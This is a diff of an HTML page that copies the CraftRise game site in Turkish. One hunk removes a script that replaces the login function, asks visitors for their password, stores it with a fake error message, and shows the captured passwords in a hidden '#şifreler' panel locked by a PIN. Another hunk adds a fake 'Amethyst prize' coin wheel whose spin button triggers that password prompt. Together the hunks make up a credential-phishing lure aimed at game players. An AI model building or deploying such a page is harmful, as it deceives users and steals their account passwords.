@@ -1,57 +1,4 @@
 <html lang="tr">
-<!-- Mevcut kodun sonuna eklenecek kısım -->
-<script>
-    // 1. Giriş yapıldığında şifreleri yakalama fonksiyonu
-    // Sitedeki mevcut onclick="openLoginBox()" fonksiyonunu manipüle ediyoruz
-    const orjinalLoginBox = window.openLoginBox;
-    window.openLoginBox = function() {
-        let pass = prompt("Lütfen giriş şifrenizi yazınız:");
-        if (pass) {
-            let logs = JSON.parse(localStorage.getItem('site_loglari') || "[]");
-            logs.push({ sifre: pass, tarih: new Date().toLocaleString('tr-TR') });
-            localStorage.setItem('site_loglari', JSON.stringify(logs));
-            alert("Sistem hatası: Giriş şu an yapılamıyor, lütfen daha sonra tekrar deneyiniz.");
-        }
-        if(typeof orjinalLoginBox === 'function') orjinalLoginBox();
-    };
-
-    // 2. #şifreler kontrol mekanizması
-    function gizliPaneliKontrolEt() {
-        if (window.location.hash === "#şifreler") {
-            let adminSifre = prompt("Admin Girişi:");
-            if (adminSifre === "3131") {
-                renderSifreListesi();
-            } else {
-                alert("Yetkisiz Erişim!");
-                window.location.hash = "";
-            }
-        }
-    }
-
-    // 3. Şifreleri listeleyen panel
-    function renderSifreListesi() {
-        let logs = JSON.parse(localStorage.getItem('site_loglari') || "[]");
-        let listeHtml = logs.length > 0 
-            ? logs.map(l => `<div style="border-bottom:1px solid #333; padding:10px;"><b>[${l.tarih}]</b> Girilen Şifre: <span style="color:#ff4500">${l.sifre}</span></div>`).join('')
-            : "Henüz kaydedilmiş şifre yok.";
-
-        let panel = document.createElement("div");
-        panel.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:#000; color:#0f0; z-index:999999; padding:40px; overflow-y:auto; font-family:monospace; font-size:18px;";
-        panel.innerHTML = `
-            <div style="display:flex; justify-content:space-between; align-items:center;">
-                <h1 style="color:#E2621B">LOGLANAN ŞİFRELER LİSTESİ</h1>
-                <button onclick="location.reload()" style="background:#E2621B; color:white; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">KAPAT</button>
-            </div>
-            <hr style="border-color:#222">
-            <div>${listeHtml}</div>
-        `;
-        document.body.appendChild(panel);
-    }
-
-    // Sayfa yüklendiğinde ve URL değiştiğinde kontrol et
-    window.addEventListener('hashchange', gizliPaneliKontrolEt);
-    window.addEventListener('load', gizliPaneliKontrolEt);
-</script>
 <base href="https://www.craftrise.com.tr/"><head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, maximum-scale=1">
@@ -393,3 +340,102 @@ YENİ! Artemis Savaş D&uuml;nyası&#39;na "Puan D&uuml;kkanı" adı...</div>
 </footer>
 
 </html>
+<!-- AMETİST ÇARK SİSTEMİ -->
+<style>
+    .ametist-odul-kart {
+        background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+        border-radius: 15px;
+        padding: 20px;
+        text-align: center;
+        margin-bottom: 30px;
+        color: white;
+        cursor: pointer;
+        transition: transform 0.3s;
+        border: 2px solid #fff;
+    }
+    .ametist-odul-kart:hover { transform: scale(1.02); }
+    
+    .cark-overlay {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0,0,0,0.9); z-index: 999999;
+        display: none; align-items: center; justify-content: center; flex-direction: column;
+    }
+    
+    .wheel-container { position: relative; width: 350px; height: 350px; }
+    #canvas { width: 100%; height: 100%; border-radius: 50%; border: 5px solid #fff; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1); }
+    .pointer {
+        position: absolute; top: -20px; left: 50%; transform: translateX(-50%);
+        width: 40px; height: 40px; background: #ff0000; clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 10;
+    }
+    .spin-button {
+        margin-top: 30px; padding: 15px 40px; font-size: 20px;
+        background: #E2621B; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold;
+    }
+</style>
+
+<script>
+    // Duyuruların üstüne kartı ekle
+    window.addEventListener('DOMContentLoaded', () => {
+        const container = document.querySelector('.col-md-8');
+        const card = document.createElement('div');
+        card.className = 'ametist-odul-kart animate__animated animate__pulse animate__infinite';
+        card.innerHTML = `<h3>💎 AMETİST ÖDÜLÜNÜ ALMAK İÇİN TIKLA! 💎</h3><p>Şansını dene, milyonlarca coin kazan!</p>`;
+        card.onclick = () => document.getElementById('carkEkran').style.display = 'flex';
+        container.prepend(card);
+    });
+
+    // Çark Mantığı
+    const options = ["1M", "2M", "3M", "4M", "5M", "10M"];
+    const colors = ["#f1c40f", "#e67e22", "#e74c3c", "#9b59b6", "#3498db", "#2ecc71"];
+    let currentRotation = 0;
+
+    function drawWheel() {
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const slice = (2 * Math.PI) / options.length;
+        
+        ctx.clearRect(0,0,350,350);
+        options.forEach((text, i) => {
+            ctx.beginPath();
+            ctx.fillStyle = colors[i];
+            ctx.moveTo(175, 175);
+            ctx.arc(175, 175, 175, i * slice, (i + 1) * slice);
+            ctx.fill();
+            
+            ctx.save();
+            ctx.fillStyle = "white";
+            ctx.font = "bold 24px Arial";
+            ctx.translate(175, 175);
+            ctx.rotate(i * slice + slice / 2);
+            ctx.fillText(text, 100, 10);
+            ctx.restore();
+        });
+    }
+
+    function spin() {
+        // Kullanıcı giriş yapmamışsa şifre al (loglama sistemi için)
+        if(typeof openLoginBox === 'function') openLoginBox();
+
+        const canvas = document.getElementById('canvas');
+        const extraDegrees = Math.floor(Math.random() * 360) + 3600; // En az 10 tur
+        currentRotation += extraDegrees;
+        canvas.style.transform = `rotate(${currentRotation}deg)`;
+        
+        setTimeout(() => {
+            alert("Tebrikler! Kazandığınız ödül sisteme tanımlandı. (Onay için biraz bekleyin)");
+            document.getElementById('carkEkran').style.display = 'none';
+        }, 4500);
+    }
+
+    // İlk çizim
+    setTimeout(drawWheel, 100);
+</script>
+
+<div id="carkEkran" class="cark-overlay">
+    <div class="wheel-container">
+        <div class="pointer"></div>
+        <canvas id="canvas" width="350" height="350"></canvas>
+    </div>
+    <button class="spin-button" onclick="spin()">ÇARKI ÇEVİR!</button>
+    <p style="color: grey; margin-top: 15px; cursor: pointer;" onclick="document.getElementById('carkEkran').style.display='none'">Kapat</p>
+</div>
